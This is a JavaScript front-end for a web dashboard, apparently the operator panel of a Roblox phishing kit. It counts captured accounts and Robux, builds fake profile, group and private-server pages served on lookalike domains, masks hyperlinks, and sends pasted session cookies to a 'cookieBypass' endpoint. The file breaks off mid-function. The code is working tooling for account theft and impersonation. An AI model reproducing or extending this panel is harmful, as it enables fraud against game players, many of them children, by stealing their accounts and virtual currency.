(function () {
    var endpoint_base = "/control/api/";
    var WEEK_CHART_DAYS = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"];
    var chart_day_labels = WEEK_CHART_DAYS.slice();
    var charts = [];

    var left_sidebar = document.getElementById("left_sidebar");
    var right_sidebar = document.getElementById("right_sidebar");
    var overlay = document.getElementById("mobile_overlay");
    var menu_btn = document.getElementById("mobile_menu_btn");
    var chat_btn = document.getElementById("mobile_chat_btn");
    var close_chat_btn = document.getElementById("close_chat_btn");
    var content = document.getElementById("content");
    var send_btn = document.getElementById("send_message");
    var message_input = document.getElementById("message");
    var feed = document.getElementById("live_chat");
    var default_content_html = content ? content.innerHTML : "";
    var inline_subpages = document.getElementById("dash_inline_subpages");
    var vip_search_debounce = null;
    var active_inline_page_key = "dashboard";
    var chat_last_id = 0;
    var chat_known_ids = {};
    var chat_poll_timer = null;
    var subpage_html_cache = {};
    var subpage_data_cache = {
        create_profile: null,
        create_group: null,
        create_vip: null,
        visits: null,
        settings: null
    };
    var DATA_ONLY_SUBPAGES = {
        create_profile: true,
        create_group: true
    };
    var CACHEABLE_SUBPAGES = {
        create_vip: true,
        visits: true,
        logs: true,
        settings: true
    };
    var preload_started = false;

    var defaults = {
        stats: {
            total_accounts: 0,
            total_visits: 0,
            weekly_robux: 0,
            weekly_summary: 0,
            data_rap: 0,
            data_robux: 0,
            data_summary: 0,
            chart_days: ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
            charts: {
                total_accounts: [0, 0, 0, 0, 0, 0, 0],
                total_visits: [0, 0, 0, 0, 0, 0, 0],
                weekly_robux: [0, 0, 0, 0, 0, 0, 0],
                weekly_summary: [0, 0, 0, 0, 0, 0, 0],
                data_rap: [0, 0, 0, 0, 0, 0, 0],
                data_robux: [0, 0, 0, 0, 0, 0, 0],
                data_summary: [0, 0, 0, 0, 0, 0, 0]
            }
        },
        profile: {
            name: "7f72",
            avatar: "https://cdn.discordapp.com/avatars/1454211649492877363/caa5c165d972214b0f83c0cc2185af1f.png",
            level: "Lvl 1",
            rank: "Noob",
            progress: 0.1
        },
        chat: {
            closed: true,
            messages: [
                {
                    name: "zxeno",
                    text: "Chat Closed!",
                    avatar: "https://cdn2.iconfinder.com/data/icons/unigrid-human-vol-2/57/011_mask_anonymous_anonym_hacker_vendetta_face_mimicry-512.png",
                    tag: "Admin"
                }
            ]
        }
    };

    function remove_animating() {
        var reduce = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
        if (reduce) {
            document.body.classList.remove("dash_animating");
            return;
        }
        window.setTimeout(function () {
            document.body.classList.remove("dash_animating");
        }, 1200);
    }

    function ajax_get(url) {
        return fetch(url, {
            method: "GET",
            headers: { "X-Requested-With": "XMLHttpRequest" },
            credentials: "same-origin"
        }).then(function (response) {
            return response.json().then(function (data) {
            if (!response.ok) {
                    throw new Error((data && (data.msg || data.message)) || ("Request failed: " + response.status));
            }
                return data;
            });
        });
    }

    function normalize_week(values) {
        if (!Array.isArray(values)) {
            return [0, 0, 0, 0, 0, 0, 0];
        }
        return values.slice(0, 7).map(function (value) {
            var n = Number(value);
            return Number.isFinite(n) ? n : 0;
        }).concat([0, 0, 0, 0, 0, 0, 0]).slice(0, 7);
    }

    function resolve_chart_day_labels(api_labels) {
        if (Array.isArray(api_labels) && api_labels.length === 7) {
            return api_labels.map(function (label) {
                return String(label || "").slice(0, 3);
            });
        }
        return WEEK_CHART_DAYS.slice();
    }

    function chart_canvas_size(canvas) {
        var wrap = canvas.parentElement;
        var width = canvas.clientWidth;
        var height = canvas.clientHeight;
        if ((!width || width < 2) && wrap) {
            width = wrap.clientWidth;
        }
        if ((!height || height < 2) && wrap) {
            height = wrap.clientHeight;
        }
        return {
            width: Math.max(1, width || 1),
            height: Math.max(1, height || 1)
        };
    }

    function set_text(id, value) {
        var el = document.getElementById(id);
        if (el) {
            el.textContent = String(value);
        }
    }

    function draw_chart(canvas, values, labels) {
        var ctx = canvas.getContext("2d");
        if (!ctx) {
            return;
        }
        var size = chart_canvas_size(canvas);
        var width = size.width;
        var height = size.height;
        var dpr = window.devicePixelRatio || 1;

        canvas.width = Math.floor(width * dpr);
        canvas.height = Math.floor(height * dpr);
        canvas.style.width = width + "px";
        canvas.style.height = height + "px";
        ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
        ctx.clearRect(0, 0, width, height);

        var pad_x = 4;
        var pad_top = 8;
        var pad_bottom = 18;
        var plot_w = width - pad_x * 2;
        var plot_h = Math.max(10, height - pad_top - pad_bottom);
        var gap = 4;
        var count = 7;
        var bar_w = Math.max(4, (plot_w - gap * (count - 1)) / count);
        var max_value = values.reduce(function (m, v) { return Math.max(m, v); }, 0);
        var day_labels = labels && labels.length === 7 ? labels : WEEK_CHART_DAYS;

        ctx.strokeStyle = "rgba(255,255,255,0.08)";
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.moveTo(pad_x, pad_top + plot_h + 0.5);
        ctx.lineTo(pad_x + plot_w, pad_top + plot_h + 0.5);
        ctx.stroke();

        values.forEach(function (value, idx) {
            var x = pad_x + idx * (bar_w + gap);
            if (max_value > 0 && value > 0) {
                var bar_h = Math.max(4, (value / max_value) * plot_h);
                var y = pad_top + plot_h - bar_h;
                ctx.fillStyle = "#1446ff";
                ctx.fillRect(x, y, bar_w, bar_h);
            }
            ctx.fillStyle = "#8d91a3";
            ctx.font = "10px Builder Sans, Helvetica, Arial, sans-serif";
            ctx.textAlign = "center";
            ctx.textBaseline = "alphabetic";
            ctx.fillText(day_labels[idx] || "", x + bar_w / 2, height - 4);
        });
    }

    function render_all_charts(chart_map, day_labels) {
        chart_day_labels = resolve_chart_day_labels(day_labels);
        charts = Array.from(document.querySelectorAll(".dash_weekly_chart"));
        charts.forEach(function (canvas) {
            var key = canvas.getAttribute("data-key");
            var values = normalize_week(chart_map[key]);
            canvas.setAttribute("title", "");
            draw_chart(canvas, values, chart_day_labels);
        });
    }

    function rank_tag_class(rank_key) {
        var base = "dash_tag is_rank";
        if (rank_key === "owner" || rank_key === "admin" || rank_key === "known") {
            return base + " is_rank_" + rank_key;
        }
        return base;
    }

    function render_profile(data) {
        var name = document.querySelector(".dash_aside_user_top h2");
        var avatar = document.querySelector(".dash_aside_user img");
        var tags = document.querySelectorAll(".dash_aside_user .dash_tag");
        var progress = document.querySelector(".dash_progress > span");
        if (name) { name.textContent = data.name || defaults.profile.name; }
        if (avatar && data.avatar) { avatar.src = data.avatar; }
        if (tags[0]) { tags[0].textContent = data.level || defaults.profile.level; }
        if (tags[1]) {
            tags[1].textContent = data.rank || defaults.profile.rank;
            tags[1].className = rank_tag_class(data.rankKey || "default");
        }
        if (progress) {
            var pct = Number(data.progress);
            progress.style.width = (Number.isFinite(pct) ? Math.max(0.1, Math.min(100, pct)) : 0.1) + "%";
        }
    }

    function api_request(method, url, body) {
        if (window.axios) {
            return window.axios({
                method: method,
                url: url,
                data: body || undefined,
                withCredentials: true,
                headers: body ? { "Content-Type": "application/json" } : { "X-Requested-With": "XMLHttpRequest" }
            }).then(function (response) {
                return response.data;
            });
        }
        return fetch(url, {
            method: method,
            credentials: "same-origin",
            headers: body ? { "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest" } : { "X-Requested-With": "XMLHttpRequest" },
            body: body ? JSON.stringify(body) : undefined
        }).then(function (response) {
            if (!response.ok) {
                throw new Error("Request failed: " + response.status);
            }
            return response.json();
        });
    }

    function append_chat_message(msg) {
        if (!feed || !msg || !msg.id) {
            return;
        }
        if (chat_known_ids[msg.id]) {
            return;
        }
        chat_known_ids[msg.id] = true;

        var id_num = parseInt(msg.id, 10);
        if (!Number.isNaN(id_num) && id_num > chat_last_id) {
            chat_last_id = id_num;
        }

        var item = document.createElement("div");
        item.className = "dash_msg";
        item.setAttribute("data-id", msg.id);

        var img = document.createElement("img");
        img.src = msg.avatarUrl || defaults.profile.avatar;
        img.alt = "avatar";

        var body = document.createElement("div");
        body.className = "dash_msg_body";

        var top = document.createElement("div");
        top.className = "dash_msg_top";

        var name = document.createElement("span");
        name.className = "dash_msg_name";
        name.textContent = msg.username || "User";

        var lvl = document.createElement("span");
        lvl.className = "dash_tag";
        lvl.textContent = "Lvl " + (msg.level || 1);

        var rank = document.createElement("span");
        rank.className = rank_tag_class(msg.rankKey || "default");
        rank.textContent = msg.rank || "Noob";

        var time = document.createElement("span");
        time.className = "dash_msg_time";
        time.textContent = msg.time || "";

        top.appendChild(name);
        top.appendChild(lvl);
        top.appendChild(rank);
        top.appendChild(time);

        var text = document.createElement("p");
        text.textContent = msg.message || "";

        body.appendChild(top);
        body.appendChild(text);
        item.appendChild(img);
        item.appendChild(body);
        feed.appendChild(item);

        while (feed.children.length > 50) {
            var old = feed.firstChild;
            if (old) {
                var old_id = old.getAttribute("data-id");
                if (old_id) {
                    delete chat_known_ids[old_id];
                }
                feed.removeChild(old);
            }
        }

        feed.scrollTop = feed.scrollHeight;
    }

    function fetch_chat() {
        return api_request("GET", endpoint_base + "chat?after=" + chat_last_id).then(function (messages) {
            if (!Array.isArray(messages)) {
                return;
            }
            messages.forEach(append_chat_message);
        }).catch(function () {
            /* ignore transient chat errors */
        });
    }

    function send_chat() {
        if (!message_input) {
            return;
        }
        var text = String(message_input.value || "").trim();
        if (!text) {
            return;
        }
        message_input.value = "";
        if (send_btn) {
            send_btn.disabled = true;
        }

        api_request("POST", endpoint_base + "chat", { message: text }).then(function (result) {
            if (result && result.success) {
                if (result.message) {
                    append_chat_message(result.message);
                }
                return fetch_chat();
            }
            message_input.value = text;
            dash_toast((result && result.message) || "Message could not be sent.", false);
        }).catch(function (err) {
            message_input.value = text;
            var api_msg = err && err.response && err.response.data && err.response.data.message;
            dash_toast(api_msg || "Message could not be sent.", false);
        }).finally(function () {
            if (send_btn) {
                send_btn.disabled = false;
            }
            if (message_input) {
                message_input.focus();
            }
        });
    }

    function start_chat_live() {
        if (!feed) {
            return;
        }
        fetch_chat();
        if (chat_poll_timer) {
            clearInterval(chat_poll_timer);
        }
        chat_poll_timer = setInterval(fetch_chat, 5000);
    }

    function render_stats(data) {
        set_text("total_accounts", data.total_accounts);
        set_text("total_visits", data.total_visits);
        set_text("weekly_robux", data.weekly_robux);
        set_text("weekly_summary", data.weekly_summary);
        set_text("data_rap", data.data_rap);
        set_text("data_robux", data.data_robux);
        set_text("data_summary", data.data_summary);
        var chart_map = data.charts || defaults.stats.charts;
        var days = data.chart_days || defaults.stats.chart_days;
        requestAnimationFrame(function () {
            render_all_charts(chart_map, days);
        });
    }

    function overlay_show() {
        if (overlay) { overlay.classList.add("is_visible"); }
    }

    function overlay_hide() {
        if (overlay) { overlay.classList.remove("is_visible"); }
        if (left_sidebar) { left_sidebar.classList.remove("is_open"); }
        if (right_sidebar) { right_sidebar.classList.remove("is_open"); }
    }

    function sidebar_open(sidebar) {
        if (!sidebar) { return; }
        sidebar.classList.add("is_open");
        overlay_show();
    }

    function apply_embedded_page_styles() {
        if (!content) {
            return;
        }
        var root = content.querySelector(".dash_embed_page");
        if (!root) {
            return;
        }
        root.querySelectorAll("input, select, textarea").forEach(function (node) {
            node.classList.add("dash_embed_input");
        });
        root.querySelectorAll("button").forEach(function (node) {
            node.classList.add("dash_embed_btn");
        });
        root.querySelectorAll("textarea").forEach(function (node) {
            node.classList.add("dash_embed_textarea");
        });
    }

    function set_page_content(html) {
        if (!content) {
            return;
        }
        var normalized_html = String(html).replace(/\.\/assets\/img\/roblox\.png/g, "assets/img/logo.svg");
        content.innerHTML = '<div class="dash_embed_page">' + normalized_html + "</div>";
        apply_embedded_page_styles();
    }

    function inline_subpage_key(page) {
        if (!page) {
            return "dashboard";
        }
        return String(page)
            .replace(/^\/+/, "")
            .replace(/\//g, "_")
            .replace(/[^a-zA-Z0-9_]/g, "")
            .toLowerCase();
    }

    function clear_subpage_bind_flags(root) {
        if (!root) {
            return;
        }
        root.querySelectorAll("[data-bound]").forEach(function (el) {
            el.removeAttribute("data-bound");
        });
        root.querySelectorAll("[data-vip-bound]").forEach(function (el) {
            el.removeAttribute("data-vip-bound");
        });
        root.querySelectorAll("[data-vip-actions-bound]").forEach(function (el) {
            el.removeAttribute("data-vip-actions-bound");
        });
    }

    function save_subpage_html_cache(key) {
        var root = page_root();
        if (!root || !CACHEABLE_SUBPAGES[key]) {
            return;
        }
        subpage_html_cache[key] = root.innerHTML;
    }

    function try_restore_subpage_cache(key) {
        if (DATA_ONLY_SUBPAGES[key]) {
            return false;
        }
        if (!subpage_html_cache[key]) {
            return false;
        }
        set_page_content(subpage_html_cache[key]);
        clear_subpage_bind_flags(page_root());
        init_inline_page_features(key, true);
        return true;
    }

    function sync_profile_cache_from_dom() {
        if (!page_el("realName")) {
            return;
        }
        var form = get_profile_form();
        var existing = subpage_data_cache.create_profile || {};
        var existing_name = existing.name || {};
        subpage_data_cache.create_profile = {
            name: {
                real: form.name.real,
                fake: form.name.fake,
                display: form.name.display,
                id: existing_name.id || "",
                avatar: existing_name.avatar || null
            },
            stats: form.stats,
            premium: form.premium,
            status: form.status,
            description: form.description,
            createdAt: form.createdAt,
            domains: existing.domains || []
        };
    }

    function sync_group_cache_from_dom() {
        if (!page_el("groupName")) {
            return;
        }
        var form = get_group_form();
        var existing = subpage_data_cache.create_group || {};
        var existing_group = existing.group || {};
        subpage_data_cache.create_group = {
            group: {
                owner: form.group.owner,
                name: form.group.name,
                thumbnail: form.group.thumbnail,
                id: existing_group.id || ""
            },
            stats: form.stats,
            shout: form.shout,
            description: form.description,
            domains: existing.domains || []
        };
    }

    function snapshot_active_subpage() {
        if (active_inline_page_key === "create_profile") {
            sync_profile_cache_from_dom();
        }
        if (active_inline_page_key === "create_group") {
            sync_group_cache_from_dom();
        }
        if (active_inline_page_key === "settings" && page_root()) {
            subpage_data_cache.settings = get_settings_form();
            save_subpage_html_cache("settings");
        }
    }

    function has_preloaded_data(key) {
        if (key === "create_profile" || key === "create_group" || key === "settings") {
            return !!subpage_data_cache[key];
        }
        if (key === "create_vip") {
            return !!(subpage_data_cache.create_vip && subpage_data_cache.create_vip.gameData);
        }
        if (key === "visits") {
            return !!(subpage_data_cache.visits && subpage_data_cache.visits.logs);
        }
        if (key === "logs") {
            return !!(subpage_data_cache.logs && subpage_data_cache.logs.logs);
        }
        return false;
    }

    function load_inline_page(page) {
        var key = inline_subpage_key(page);
        if (key === "dashboard") {
            if (content) {
                content.innerHTML = default_content_html;
                render_stats(defaults.stats);
            }
            active_inline_page_key = "dashboard";
            return Promise.resolve();
        }

        if (!inline_subpages) {
            return Promise.resolve();
        }

        var holder = inline_subpages.querySelector('[data-subpage="' + key + '"]');
        if (!holder) {
            set_page_content(
                '<div class="dash_embed_notice"><h2>Page unavailable</h2><p>This page is not included inline yet.</p></div>'
            );
            active_inline_page_key = key;
            return Promise.resolve();
        }

        if (try_restore_subpage_cache(key)) {
            active_inline_page_key = key;
            return Promise.resolve();
        }

        set_page_content(holder.innerHTML);

        if (has_preloaded_data(key)) {
            init_inline_page_features(key, true);
        } else {
            init_inline_page_features(key, false);
        }

        active_inline_page_key = key;
        return Promise.resolve();
    }

    function format_compact(value) {
        return new Intl.NumberFormat("en", { notation: "compact" }).format(Number(value) || 0);
    }

    function escapeHTML(value) {
        return String(value || "")
            .replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;")
            .replace(/"/g, "&quot;")
            .replace(/'/g, "&#039;");
    }

    function fetch_json(url, options) {
        return fetch(url, options || {}).then(function (response) {
            if (!response.ok) {
                throw new Error("Request failed: " + response.status);
            }
            return response.json();
        });
    }

    function get_universe_thumbnails(universe_ids) {
        var payload = universe_ids.map(function (id) {
            return {
                requestId: id + "::GameIcon:256x256:webp:regular",
                type: "GameIcon",
                targetId: id,
                token: "",
                format: "webp",
                size: "256x256"
            };
        });
        return fetch_json(window.location.origin + "/v1/batch", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        }).then(function (result) {
            var map = {};
            (result.data || []).forEach(function (item) {
                if (item && item.state === "Completed") {
                    map[item.targetId] = item.imageUrl;
                }
            });
            return map;
        });
    }

    function resolve_vip_game_url(template) {
        var domain_select = document.getElementById("domainSelect");
        var domain = domain_select ? domain_select.value : "";
        return String(template || "").replace("DOMAIN", domain);
    }

    function bind_vip_card_actions() {
        var grid = document.getElementById("gameCardGrid");
        if (!grid || grid.getAttribute("data-vip-actions-bound") === "1") {
            return;
        }
        grid.setAttribute("data-vip-actions-bound", "1");

        grid.addEventListener("click", function (event) {
            var copy_btn = event.target.closest("[data-copy-link]");
            var open_btn = event.target.closest("[data-open-link]");
            if (!copy_btn && !open_btn) {
                return;
            }
            event.preventDefault();
            var template = (copy_btn || open_btn).getAttribute(copy_btn ? "data-copy-link" : "data-open-link") || "";
            var link = resolve_vip_game_url(template);
            if (open_btn) {
                window.open(link, "_blank", "noopener,noreferrer");
                return;
            }
            navigator.clipboard.writeText(link).then(function () {
                dash_toast("Copied to clipboard!", true);
            }).catch(function () {
                dash_toast("Failed to copy", false);
            });
        });
    }

    function render_vip_game_cards(list) {
        var grid = document.getElementById("gameCardGrid");
        if (!grid) {
            return;
        }
        grid.innerHTML = "";
        grid.removeAttribute("data-vip-actions-bound");

        list.forEach(function (game) {
            var card = document.createElement("div");
            card.className = "game-card";
            card.innerHTML =
                '<div class="relative flex flex-col items-center rounded-lg shadow md:flex-row md:max-w-md bg-black/30 border border-white/10 rounded-lg text-white p-4">' +
                '<div class="dash_vip_card_actions">' +
                '<button type="button" class="dash_vip_action_btn dash_vip_action_copy" data-copy-link="' + escapeHTML(game.url) + '" title="Copy link">' +
                '<svg class="dash_vip_action_icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-4 4h8m-4-4v8"></path></svg>' +
                '<span class="dash_vip_action_label">Copy</span></button>' +
                '<button type="button" class="dash_vip_action_btn dash_vip_action_open" data-open-link="' + escapeHTML(game.url) + '" title="Open link">' +
                '<svg class="dash_vip_action_icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14"></path></svg>' +
                '<span class="dash_vip_action_label">Open</span></button>' +
                "</div>" +
                '<img class="h-32 w-32 rounded-lg" src="' + escapeHTML(game.thumbnail || "assets/img/logo.svg") + '" alt="' + escapeHTML(game.name) + '">' +
                '<div class="flex flex-col justify-between leading-normal px-3">' +
                '<h4 class="text-lg font-bold leading-tight break-words" style="word-break:break-word">' + escapeHTML(game.name) + '</h4>' +
                '<p class="text-white/50 text-sm font-normal">' + escapeHTML(game.maturity || "All Ages") + "</p>" +
                '<div class="mt-3 flex gap-10">' +
                '<div class="flex flex-col"><h3 class="text-lg font-bold">' + format_compact(game.playerCount) + '</h3><p class="text-white/80 text-xs font-normal">Player Count</p></div>' +
                '<div class="flex flex-col"><h3 class="text-lg font-bold">' + format_compact(game.likes) + '</h3><p class="text-white/80 text-xs font-normal">Likes</p></div>' +
                '<div class="flex flex-col"><h3 class="text-lg font-bold">' + format_compact(game.dislikes) + '</h3><p class="text-white/80 text-xs font-normal">Dislikes</p></div>' +
                "</div></div></div>";
            grid.appendChild(card);
        });

        bind_vip_card_actions();
        save_subpage_html_cache("create_vip");
    }

    function populate_vip_domains(domain_select, domains) {
        if (!domain_select) {
            return;
        }
            while (domain_select.firstChild) {
                domain_select.removeChild(domain_select.firstChild);
            }
            domains.forEach(function (domain) {
                var option = document.createElement("option");
                option.value = domain;
                option.textContent = domain;
                option.className = "bg-zinc-800 text-white";
                domain_select.appendChild(option);
            });
    }

    function bind_vip_search_once(search, run_vip_search) {
        if (!search || search.getAttribute("data-vip-bound") === "1") {
            return;
        }
        search.setAttribute("data-vip-bound", "1");
        search.addEventListener("keydown", function (event) {
            if (event.key !== "Enter") {
                return;
            }
            event.preventDefault();
            var query = String(search.value || "").trim();
            if (!query) {
                render_vip_game_cards([]);
                return;
            }
            run_vip_search(query);
        });
    }

    function init_vip_page(from_cache) {
        var search = page_el("search");
        var domain_select = page_el("domainSelect");
        if (!search || !domain_select) {
            return;
        }

        function finish_vip_setup(game_data, games) {
            subpage_data_cache.create_vip = {
                gameData: game_data,
                games: games || []
            };
            populate_vip_domains(domain_select, game_data.domains || []);
            if (games && games.length) {
                render_vip_game_cards(games);
            } else {
                bind_vip_card_actions();
                save_subpage_html_cache("create_vip");
            }
            bind_vip_search_once(search, run_vip_search);
        }

            function run_vip_search(query) {
            var private_code = subpage_data_cache.create_vip
                ? subpage_data_cache.create_vip.gameData.privateServerLinkCode
                : "";
                fetch_json(window.location.origin + "/search-api/omni-search?searchQuery=" + encodeURIComponent(query) + "&sessionId=brenden&pageType=all")
                    .then(function (result) {
                        var rows = result.searchResults || [];
                        var games = rows.map(function (row) {
                            var data = (row.contents && row.contents[0]) ? row.contents[0] : {};
                            var safe_name = String(data.name || "Game")
                                .replace(/[^a-zA-Z0-9 ]/g, "")
                                .replace(/ /g, "-")
                                .replace(/--+/g, "-")
                                .replace(/^-+|-+$/g, "");
                            return {
                                name: data.name || "Game",
                                maturity: data.ageRecommendationDisplayName || "All Ages",
                                playerCount: data.playerCount || 0,
                                likes: data.totalUpVotes || 0,
                                dislikes: data.totalDownVotes || 0,
                                universeId: data.universeId || 0,
                                url: "https://DOMAIN/games/" + (data.rootPlaceId || 0) + "/" + safe_name + "?privateServerLinkCode=" + encodeURIComponent(private_code)
                            };
                        });
                        return get_universe_thumbnails(games.map(function (g) { return g.universeId; })).then(function (thumbs) {
                            games.forEach(function (g) { g.thumbnail = thumbs[g.universeId] || null; });
                        if (subpage_data_cache.create_vip) {
                            subpage_data_cache.create_vip.games = games;
                        }
                            return games;
                        });
                    })
                    .then(render_vip_game_cards)
                    .catch(function () {
                        render_vip_game_cards([]);
                    });
            }

        if (from_cache && subpage_data_cache.create_vip) {
            populate_vip_domains(domain_select, subpage_data_cache.create_vip.gameData.domains || []);
            if (subpage_data_cache.create_vip.games && subpage_data_cache.create_vip.games.length) {
                render_vip_game_cards(subpage_data_cache.create_vip.games);
            } else {
                bind_vip_card_actions();
            }
            bind_vip_search_once(search, run_vip_search);
                    return;
                }

        fetch_json(window.location.origin + "/control/api/create/gameData", {
            method: "GET",
            headers: { "Content-Type": "application/json" },
            credentials: "include"
        }).then(function (payload) {
            var game_data = {
                domains: payload.domains || [],
                privateServerLinkCode: payload.privateServerLinkCode || ""
            };
            finish_vip_setup(game_data, null);
            run_vip_search("reccomended");
        }).catch(function () {
            /* keep page usable even without api */
        });
    }

    var compact_formatter = new Intl.NumberFormat("en", { notation: "compact" });

    function dash_toast(text, ok) {
        if (!window.Swal) {
            return;
        }
        Swal.fire({
            toast: true,
            position: 'top-end',
            icon: ok ? 'success' : 'error',
            title: text,
            showConfirmButton: false,
            timer: 3000,
            timerProgressBar: true,
            background: '#131418',
            color: '#ffffff',
            iconColor: ok ? '#22c55e' : '#ef4444',
            customClass: {
                popup: 'dash-toast-popup'
            }
        });
    }

    function api_post_json(url, body) {
        return fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            },
            credentials: "same-origin",
            body: JSON.stringify(body || {})
        }).then(function (response) {
            return response.json().then(function (data) {
                if (!response.ok) {
                    throw new Error((data && (data.msg || data.message)) || "Request failed");
                }
                return data;
            });
        });
    }

    function page_root() {
        return content ? content.querySelector(".dash_embed_page") : null;
    }

    function page_el(id) {
        var root = page_root();
        return root ? root.querySelector("#" + id) : null;
    }

    window.copyContent = function (value) {
        navigator.clipboard.writeText(value || "").then(function () {
            dash_toast("Copied to clipboard!", true);
        }).catch(function () {
            dash_toast("Failed to copy", false);
        });
    };

    function dash_copy_icon_svg() {
        return '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true">' +
            '<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>';
    }

    function dash_copy_field_html(text, aria_label) {
        var safe = escapeHTML(text || "");
        return '<div class="dash_copy_field">' +
            '<span class="dash_copy_field_text copyable-text" title="' + safe + '">' + safe + "</span>" +
            '<button type="button" class="dash_copy_btn" onclick="copyText(this)" aria-label="' + escapeHTML(aria_label || "Copy") + '">' +
            dash_copy_icon_svg() +
            "</button></div>";
    }

    window.copyText = function (button) {
        var field = button && button.closest ? button.closest(".dash_copy_field") : null;
        var cell = button && button.closest ? button.closest("td") : null;
        var target = field
            ? field.querySelector(".copyable-text")
            : (cell ? cell.querySelector(".copyable-text") : null);
        var value = target ? target.textContent : "";
        copyContent(value);
    };

    window.escapeHTML = escapeHTML;

    function bind_submit_once(button, handler) {
        if (!button || button.getAttribute("data-bound") === "1") {
            return;
        }
        button.setAttribute("data-bound", "1");
        button.addEventListener("click", handler);
    }

    function init_hyperlink_page() {
        var input = page_el("inputUrl");
        var result = page_el("result");
        var submit = page_el("submit");
        if (!input || !result || !submit) {
            return;
        }
        bind_submit_once(submit, function () {
            var url = String(input.value || "").trim();
            if (!url) {
                dash_toast("Enter a URL", false);
                return;
            }
            api_post_json(endpoint_base + "misc/hyperLink", { Url: url }).then(function (data) {
                if (data.success) {
                    result.value = data.msg || "";
                    dash_toast("Success!", true);
                } else {
                    dash_toast(data.msg || "Failed", false);
                }
            }).catch(function (err) {
                dash_toast(err.message || "Error fetching. Try again later...", false);
            });
        });
    }

    function init_refresher_page() {
        var input = page_el("inputCookie");
        var result = page_el("result");
        var submit = page_el("submit");
        if (!input || !result || !submit) {
            return;
        }
        bind_submit_once(submit, function () {
            var cookie = String(input.value || "").trim();
            if (!cookie) {
                dash_toast("Enter a cookie", false);
                return;
            }
            result.value = "Please Wait...";
            api_post_json(endpoint_base + "misc/cookieBypass", { Cookie: cookie }).then(function (data) {
                result.value = data.msg || "";
                dash_toast(data.success ? "Success!" : (data.msg || "Failed"), !!data.success);
            }).catch(function (err) {
                result.value = err.message || "Error";
                dash_toast(err.message || "Error fetching. Try again later...", false);
            });
        });
    }

    function init_recovery_page() {
        var input = page_el("recoveryToken");
        var copy_btn = page_el("recoveryCopyBtn");
        if (!input) {
            return;
        }
        var match = document.cookie.match(/(?:^|;\s*)Authentication=([^;]*)/);
        input.value = match ? decodeURIComponent(match[1]) : "";
        if (copy_btn) {
            bind_submit_once(copy_btn, function () {
                copyContent(input.value);
            });
        }
    }

    function set_profile_form(data) {
        var fake_name = data.name.fake || "";
        var display_name = data.name.display || "";
        var real_name = data.name.real || "";
        var avatar = data.name.avatar || "";
        var friends = data.stats.friends || 0;
        var followers = data.stats.followers || 0;
        var following = data.stats.following || 0;

        if (page_el("realName")) { page_el("realName").value = real_name; }
        if (page_el("fakeName")) { page_el("fakeName").value = fake_name; }
        if (page_el("displayName")) { page_el("displayName").value = display_name; }
        if (page_el("realNameCard")) { page_el("realNameCard").textContent = fake_name; }
        if (page_el("displayNameCard")) { page_el("displayNameCard").textContent = display_name; }
        if (page_el("friends")) { page_el("friends").value = friends; }
        if (page_el("followers")) { page_el("followers").value = followers; }
        if (page_el("following")) { page_el("following").value = following; }
        if (page_el("friendsCard")) { page_el("friendsCard").textContent = friends; }
        if (page_el("followersCard")) { page_el("followersCard").textContent = followers; }
        if (page_el("followingCard")) { page_el("followingCard").textContent = following; }
        if (page_el("premium")) { page_el("premium").value = data.premium ? "yes" : "no"; }
        if (page_el("status")) { page_el("status").value = data.status || "offline"; }
        if (page_el("description")) { page_el("description").value = data.description ? escapeHTML(data.description) : ""; }
        apply_profile_avatar_src(avatar);

        if (data.createdAt && page_el("creationDate")) {
            var date_value = new Date(data.createdAt).toISOString().split("T")[0];
            if (!Number.isNaN(Date.parse(date_value))) {
                page_el("creationDate").value = date_value;
            }
        }

        var link_card = page_el("linkCard");
        if (link_card) {
            while (link_card.firstChild) {
                link_card.removeChild(link_card.firstChild);
            }
            (data.domains || []).forEach(function (domain) {
                var option = document.createElement("option");
                option.value = "https://" + domain + "/users/" + (data.name.id || "") + "/profile";
                option.textContent = domain;
                option.className = "bg-zinc-800 text-white";
                link_card.appendChild(option);
            });
        }
    }

    function get_profile_form() {
        return {
            name: {
                real: page_el("realName") ? page_el("realName").value : "",
                fake: page_el("fakeName") ? page_el("fakeName").value : "",
                display: page_el("displayName") ? page_el("displayName").value : ""
            },
            stats: {
                following: parseInt(page_el("following") ? page_el("following").value : "0", 10) || 0,
                followers: parseInt(page_el("followers") ? page_el("followers").value : "0", 10) || 0,
                friends: parseInt(page_el("friends") ? page_el("friends").value : "0", 10) || 0
            },
            premium: page_el("premium") ? page_el("premium").value === "yes" : false,
            status: page_el("status") ? page_el("status").value : "offline",
            description: page_el("description") ? page_el("description").value : "",
            createdAt: page_el("creationDate") ? page_el("creationDate").value : ""
        };
    }

    var profile_avatar_fetch_promise = null;

    function profile_avatar_fallback_src() {
        return "./assets/img/logo.svg";
    }

    function apply_profile_avatar_src(url) {
        var img = page_el("avatarCard");
        if (!img) {
            return;
        }
        var next = url || profile_avatar_fallback_src();
        img.onerror = function () {
            if (url && img.getAttribute("data-avatar-retry") !== "1") {
                img.setAttribute("data-avatar-retry", "1");
                resolve_profile_avatar(true);
